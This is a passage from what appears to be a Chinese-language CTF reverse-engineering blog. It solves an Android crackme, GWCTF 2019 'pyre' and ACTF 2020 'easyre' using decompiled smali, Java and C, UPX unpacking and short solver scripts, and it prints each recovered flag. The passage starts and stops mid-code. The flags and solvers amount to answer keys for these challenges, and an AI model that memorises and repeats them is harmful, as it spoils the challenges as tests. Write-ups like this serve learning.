class="line"></span><br><span class="line">    .line 48</span><br><span class="line">    .local v5, "x":[C</span><br><span class="line">    aget-char v7, v5, v9</span><br><span class="line"></span><br><span class="line">    const/4 v8, 0x3</span><br><span class="line"></span><br><span class="line">    aget-char v8, v5, v8</span><br><span class="line"></span><br><span class="line">    add-int/2addr v7, v8</span><br><span class="line"></span><br><span class="line">    add-int/lit8 v7, v7, -0x32</span><br><span class="line"></span><br><span class="line">    int-to-char v7, v7</span><br><span class="line"></span><br><span class="line">    aput-char v7, v5, v9</span><br><span class="line"></span><br><span class="line">    .line 49</span><br><span class="line">    const/4 v7, 0x4</span><br><span class="line"></span><br><span class="line">    aget-char v8, v5, v9</span><br><span class="line"></span><br><span class="line">    const/4 v9, 0x5</span><br><span class="line"></span><br><span class="line">    aget-char v9, v5, v9</span><br><span class="line"></span><br><span class="line">    add-int/2addr v8, v9</span><br><span class="line"></span><br><span class="line">    add-int/lit8 v8, v8, -0x30</span><br><span class="line"></span><br><span class="line">    int-to-char v8, v8</span><br><span class="line"></span><br><span class="line">    aput-char v8, v5, v7</span><br><span class="line"></span><br><span class="line">    .line 50</span><br><span class="line">    const/16 v7, 0x1e</span><br><span class="line"></span><br><span class="line">    aget-char v8, v5, v11</span><br><span class="line"></span><br><span class="line">    const/16 v9, 0x9</span><br><span class="line"></span><br><span class="line">    aget-char v9, v5, v9</span><br><span class="line"></span><br><span class="line">    add-int/2addr v8, v9</span><br><span class="line"></span><br><span class="line">    add-int/lit8 v8, v8, -0x30</span><br><span class="line"></span><br><span class="line">    int-to-char v8, v8</span><br><span class="line"></span><br><span class="line">    aput-char v8, v5, v7</span><br><span class="line"></span><br><span class="line">    .line 51</span><br><span class="line">    const/16 v7, 0xe</span><br><span class="line"></span><br><span class="line">    const/16 v8, 0x1b</span><br><span class="line"></span><br><span class="line">    aget-char v8, v5, v8</span><br><span class="line"></span><br><span class="line">    const/16 v9, 0x1c</span><br><span class="line"></span><br><span class="line">    aget-char v9, v5, v9</span><br><span class="line"></span><br><span class="line">    add-int/2addr v8, v9</span><br><span class="line"></span><br><span class="line">    add-int/lit8 v8, v8, -0x61</span><br><span class="line"></span><br><span class="line">    int-to-char v8, v8</span><br><span class="line"></span><br><span class="line">    aput-char v8, v5, v7</span><br><span class="line"></span><br><span class="line">    .line 52</span><br><span class="line">    const/4 v4, 0x0</span><br><span class="line"></span><br><span class="line">    .local v4, "i":I</span><br><span class="line">    :goto_0</span><br><span class="line">    const/16 v7, 0x10</span><br><span class="line"></span><br><span class="line">    if-lt v4, v7, :cond_2</span><br><span class="line"></span><br><span class="line">    .line 59</span><br><span class="line">    invoke-static {v5}, Ljava/lang/String;-&gt;valueOf([C)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v1</span><br><span class="line"></span><br><span class="line">    .line 60</span><br><span class="line">    .local v1, "bbb":Ljava/lang/String;</span><br><span class="line">    iget-object v7, p0, Lcom/example/flag/MainActivity$1;-&gt;val$textview:Landroid/widget/TextView;</span><br><span class="line"></span><br><span class="line">    new-instance v8, Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    const-string v9, "flag{"</span><br><span class="line"></span><br><span class="line">    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">    move-result-object v8</span><br><span class="line"></span><br><span class="line">    const-string v9, "}"</span><br></pre></td></tr></tbody></table></figure><p>上述代码应该就是最重要的部分，但也看不出什么，网上搜索一番后，发现需要用到<strong>jeb</strong> 这个工具。</p><p>利用 jeb 打开文件，再找到上述代码处，右击进行解析，得到</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.flag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v4.app.Fragment;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View$OnClickListener;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActionBarActivity</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PlaceholderFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> {</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">PlaceholderFragment</span><span class="params">()</span> {</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(LayoutInflater arg4, ViewGroup arg5, Bundle arg6)</span> {</span><br><span class="line">            <span class="keyword">return</span> arg4.inflate(<span class="number">0x7F030018</span>, arg5, <span class="literal">false</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActivity</span><span class="params">()</span> {</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg7)</span> {</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg7);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F030017</span>);</span><br><span class="line">        <span class="keyword">if</span>(arg7 == <span class="literal">null</span>) {</span><br><span class="line">            <span class="built_in">this</span>.getSupportFragmentManager().beginTransaction().add(<span class="number">0x7F05003C</span>, <span class="keyword">new</span> <span class="title class_">PlaceholderFragment</span>()).commit();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.findViewById(<span class="number">0x7F05003F</span>).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View$OnClickListener</span>(<span class="built_in">this</span>.findViewById(<span class="number">0x7F05003D</span>), <span class="built_in">this</span>.findViewById(<span class="number">0x7F05003E</span>)) {</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View arg13)</span> {</span><br><span class="line">                <span class="type">int</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="number">0x1F</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v9</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">v6</span> <span class="operator">=</span> <span class="built_in">this</span>.val$editview.getText().toString();</span><br><span class="line">                <span class="keyword">if</span>(v6.length() != <span class="number">0x20</span> || v6.charAt(v11) != <span class="number">97</span> || v6.charAt(<span class="number">1</span>) != <span class="number">98</span> || v6.charAt(<span class="number">0</span>) + v6.charAt(v9) - <span class="number">0x30</span> != <span class="number">56</span>) {</span><br><span class="line">                    v2 = <span class="number">0</span>;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(v2 == <span class="number">1</span>) {</span><br><span class="line">                    <span class="type">char</span>[] v5 = <span class="string">"dd2940c04462b4dd7c450528835cca15"</span>.toCharArray();</span><br><span class="line">                    v5[v9] = ((<span class="type">char</span>)(v5[v9] + v5[<span class="number">3</span>] - <span class="number">50</span>));</span><br><span class="line">                    v5[<span class="number">4</span>] = ((<span class="type">char</span>)(v5[v9] + v5[<span class="number">5</span>] - <span class="number">0x30</span>));</span><br><span class="line">                    v5[<span class="number">30</span>] = ((<span class="type">char</span>)(v5[v11] + v5[<span class="number">9</span>] - <span class="number">0x30</span>));</span><br><span class="line">                    v5[<span class="number">14</span>] = ((<span class="type">char</span>)(v5[<span class="number">27</span>] + v5[<span class="number">28</span>] - <span class="number">97</span>));</span><br><span class="line">                    <span class="type">int</span> v4;</span><br><span class="line">                    <span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; <span class="number">16</span>; ++v4) {</span><br><span class="line">                        <span class="type">char</span> <span class="variable">v0</span> <span class="operator">=</span> v5[<span class="number">0x1F</span> - v4];</span><br><span class="line">                        v5[<span class="number">0x1F</span> - v4] = v5[v4];</span><br><span class="line">                        v5[v4] = v0;</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">this</span>.val$textview.setText(<span class="string">"flag{"</span> + String.valueOf(v5) + <span class="string">"}"</span>);</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">else</span> {</span><br><span class="line">                    <span class="built_in">this</span>.val$textview.setText(<span class="string">"输入注册码错误"</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        });</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onCreateOptionsMenu</span><span class="params">(Menu arg3)</span> {</span><br><span class="line">        <span class="built_in">this</span>.getMenuInflater().inflate(<span class="number">0x7F0C0000</span>, arg3);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onOptionsItemSelected</span><span class="params">(MenuItem arg3)</span> {</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">v1</span> <span class="operator">=</span> arg3.getItemId() == <span class="number">0x7F050040</span> ? <span class="literal">true</span> : <span class="built_in">super</span>.onOptionsItemSelected(arg3);</span><br><span class="line">        <span class="keyword">return</span> v1;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>分析代码，编写脚本，基本语句不变，只需打印出经过处理后的v5的值</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="type">int</span> v9 = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> v2 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> v11 = <span class="number">0x1F</span>;</span><br><span class="line">    <span class="type">char</span> v5[] = <span class="string">"dd2940c04462b4dd7c450528835cca15"</span>;</span><br><span class="line">    v5[v9] = ((<span class="type">char</span>)(v5[v9] + v5[<span class="number">3</span>] - <span class="number">50</span>));</span><br><span class="line">    v5[<span class="number">4</span>] = ((<span class="type">char</span>)(v5[v9] + v5[<span class="number">5</span>] - <span class="number">0x30</span>));</span><br><span class="line">    v5[<span class="number">30</span>] = ((<span class="type">char</span>)(v5[v11] + v5[<span class="number">9</span>] - <span class="number">0x30</span>));</span><br><span class="line">    v5[<span class="number">14</span>] = ((<span class="type">char</span>)(v5[<span class="number">27</span>] + v5[<span class="number">28</span>] - <span class="number">97</span>));</span><br><span class="line">    <span class="type">int</span> v4;</span><br><span class="line">    <span class="keyword">for</span>(v4 = <span class="number">0</span>; v4 &lt; <span class="number">16</span>; ++v4) {</span><br><span class="line">        <span class="type">char</span> v0 = v5[<span class="number">0x1F</span> - v4];</span><br><span class="line">        v5[<span class="number">0x1F</span> - v4] = v5[v4];</span><br><span class="line">        v5[v4] = v0;</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;v5&lt;&lt;endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行得到 <code>flag{59acc538825054c7de4b26440c0999dd}</code>。</p><h3 id="gwctf-2019pyre">16.[GWCTF 2019]pyre</h3><p>本题参考 https://itcn.blog/p/5736602304.html</p><p>利用在线工具（https://tool.lu/pyc/）反编译pyc文件</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 2.7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Welcome to Re World!'</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'Your input1 is your flag~'</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">'%1f'</span>,</span><br><span class="line">    <span class="string">'%12'</span>,</span><br><span class="line">    <span class="string">'%1d'</span>,</span><br><span class="line">    <span class="string">'('</span>,</span><br><span class="line">    <span class="string">'0'</span>,</span><br><span class="line">    <span class="string">'4'</span>,</span><br><span class="line">    <span class="string">'%01'</span>,</span><br><span class="line">    <span class="string">'%06'</span>,</span><br><span class="line">    <span class="string">'%14'</span>,</span><br><span class="line">    <span class="string">'4'</span>,</span><br><span class="line">    <span class="string">','</span>,</span><br><span class="line">    <span class="string">'%1b'</span>,</span><br><span class="line">    <span class="string">'U'</span>,</span><br><span class="line">    <span class="string">'?'</span>,</span><br><span class="line">    <span class="string">'o'</span>,</span><br><span class="line">    <span class="string">'6'</span>,</span><br><span class="line">    <span class="string">'*'</span>,</span><br><span class="line">    <span class="string">':'</span>,</span><br><span class="line">    <span class="string">'%01'</span>,</span><br><span class="line">    <span class="string">'D'</span>,</span><br><span class="line">    <span class="string">';'</span>,</span><br><span class="line">    <span class="string">'%'</span>,</span><br><span class="line">    <span class="string">'%13'</span>]</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>猜测 code 中的值为ASCII码相对应的字符。</p><p>将字符转换为对应的ASCII码，编写脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 31 18 29 40 48 52 1 6 20 52 44 27 85 63 111 54 42 58 1 68 59 37 19</span></span><br><span class="line">s=[<span class="number">19</span>,<span class="number">37</span>,<span class="number">59</span>,<span class="number">68</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">42</span>,<span class="number">54</span>,<span class="number">111</span>,<span class="number">63</span>,<span class="number">85</span>,<span class="number">27</span>,<span class="number">44</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">52</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">29</span>,<span class="number">18</span>,<span class="number">31</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)-<span class="number">1</span>):</span><br><span class="line">    s[i+<span class="number">1</span>]=s[i+<span class="number">1</span>]^s[i]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">s.reverse()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>((s[i]-i)%<span class="number">128</span>)    <span class="comment">#由A=(B-C)%D可知B-C=D*n+A,即B=A+C+D*n,当B&lt;D时，两边对D取模，则B%D=(A+C+D*n)%D=(A+C)%D</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>运行得到flag：<code>GWHT{Just_Re_1s_Ha66y!}</code>。</p><h3 id="actf新生赛2020easyre">17.[ACTF新生赛2020]easyre</h3><p>参考：https://blog.csdn.net/weixin_46009088/article/details/109521777</p><p>首先解压tar文件</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220908202330115.png" alt="image-20220908202330115"><figcaption aria-hidden="true">image-20220908202330115</figcaption></figure><p>利用Exeinfo PE打开文件</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220908202507565.png" alt="image-20220908202507565"><figcaption aria-hidden="true">image-20220908202507565</figcaption></figure><p>发现upx壳，直接利用upx脱壳</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220908202848127.png" alt="image-20220908202848127"><figcaption aria-hidden="true">image-20220908202848127</figcaption></figure><p>F5查看main函数伪代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+12h] [ebp-2Eh]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+13h] [ebp-2Dh]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+14h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+15h] [ebp-2Bh]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+16h] [ebp-2Ah]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [esp+17h] [ebp-29h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+18h] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [esp+19h] [ebp-27h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+1Ah] [ebp-26h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+1Bh] [ebp-25h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [esp+1Ch] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+1Dh] [ebp-23h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+22h] [ebp-1Eh]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+26h] [ebp-1Ah]</span></span><br><span class="line">  __int16 v19; <span class="comment">// [esp+2Ah] [ebp-16h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+2Ch] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [esp+2Dh] [ebp-13h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+2Eh] [ebp-12h]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="string">'*'</span>;</span><br><span class="line">  v5 = <span class="string">'F'</span>;</span><br><span class="line">  v6 = <span class="string">'\''</span>;</span><br><span class="line">  v7 = <span class="string">'"'</span>;</span><br><span class="line">  v8 = <span class="number">78</span>;</span><br><span class="line">  v9 = <span class="number">44</span>;</span><br><span class="line">  v10 = <span class="number">34</span>;</span><br><span class="line">  v11 = <span class="number">40</span>;</span><br><span class="line">  v12 = <span class="number">73</span>;</span><br><span class="line">  v13 = <span class="number">63</span>;</span><br><span class="line">  v14 = <span class="number">43</span>;</span><br><span class="line">  v15 = <span class="number">64</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v19);</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)v19 != <span class="number">65</span> || HIBYTE(v19) != <span class="number">67</span> || v20 != <span class="number">84</span> || v21 != <span class="number">70</span> || v22 != <span class="number">123</span> || v26 != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v16 = v23;</span><br><span class="line">  v17 = v24;</span><br><span class="line">  v18 = v25;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v4 + i) != _data_start__[*((<span class="type">char</span> *)&amp;v16 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"You are correct!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>将第43行的数字转为字符（按R键）</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_BYTE)v19 != <span class="string">'A'</span> || HIBYTE(v19) != <span class="string">'C'</span> || v20 != <span class="string">'T'</span> || v21 != <span class="string">'F'</span> || v22 != <span class="string">'{'</span> || v26 != <span class="string">'}'</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></tbody></table></figure><p>分析代码，双击<code>_data_start_</code>查看字符串</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220908203511791.png" alt="image-20220908203511791"><figcaption aria-hidden="true">image-20220908203511791</figcaption></figure><p>猜测flag为<code>_data_start__[*((char *)&amp;v16 + i) - 1]</code>方括号里的内容，即<code>*((char *)&amp;v16 + i) - 1</code>，或者为<code>*((char *)&amp;v16 + i)</code>，编写脚本得到flag</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data_start=<span class="string">'~}|{zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(\'&amp;%$# !"'</span></span><br><span class="line">v4=[<span class="number">42</span>,<span class="number">70</span>,<span class="number">39</span>,<span class="number">34</span>,<span class="number">78</span>,<span class="number">44</span>,<span class="number">34</span>,<span class="number">40</span>,<span class="number">73</span>,<span class="number">63</span>,<span class="number">43</span>,<span class="number">64</span>]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">v16=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(data_start.find(<span class="built_in">chr</span>(v4[i]))+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><code>flag{U9X_1S_W6@T?}</code></p><h3 id="findit">18.findit</h3><p>下载附件，发现是压缩包里是apk文件，用 jeb 打开文件，发现中文提示</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000190  iget-object         v5, p0, MainActivity$1-&gt;val$text:TextView</span><br><span class="line">00000194  const-string        v6, "答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~"</span><br><span class="line">00000198  invoke-virtual      TextView-&gt;setText(CharSequence)V, v5, v6</span><br><span class="line">0000019E  goto/16             :6E</span><br><span class="line">.end method</span><br></pre></td></tr></tbody></table></figure><p>在此处右击进行解析，以下是部分代码</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 